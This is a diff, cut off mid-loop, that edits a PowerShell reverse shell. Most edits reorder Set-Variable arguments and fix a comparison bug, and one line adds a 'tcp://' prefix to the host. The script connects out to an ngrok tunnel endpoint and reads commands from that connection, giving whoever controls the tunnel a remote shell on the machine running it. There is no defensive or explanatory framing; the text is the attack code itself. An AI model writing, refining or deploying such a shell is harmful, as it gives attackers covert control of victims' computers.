@@ -1,17 +1,17 @@
-Set-Variable -Value (new-object System.Net.Sockets.TcpClient('4.tcp.ngrok.io', 11583)) -Name socket;
+Set-Variable -Name socket -Value (new-object System.Net.Sockets.TcpClient('tcp://4.tcp.ngrok.io', 11583));
 if($socket -eq $null){exit 1}
 Set-Variable -Name stream -Value ($socket.GetStream());
 Set-Variable -Name writer -Value (new-object System.IO.StreamWriter($stream));
-Set-Variable -Value (new-object System.Byte[] 1024) -Name buffer;
+Set-Variable -Name buffer -Value (new-object System.Byte[] 1024);
 Set-Variable -Name encoding -Value (new-object System.Text.AsciiEncoding);
 do
 {
         $writer.Flush();
-        Set-Variable -Value ($null) -Name read;
+        Set-Variable -Name read -Value ($null);
         Set-Variable -Name res -Value ("")
         while($stream.DataAvailable -or $read -eq $null) {
-                Set-Variable -Value ($stream.Read($buffer, 0, 1024)) -Name read
-                if ($read=0){exit}
+                Set-Variable -Name read -Value ($stream.Read($buffer, 0, 1024));
+        if ($read -eq 0){exit}
         }
         Set-Variable -Name out -Value ($encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n",""));
         if(!$out.equals("exit")){
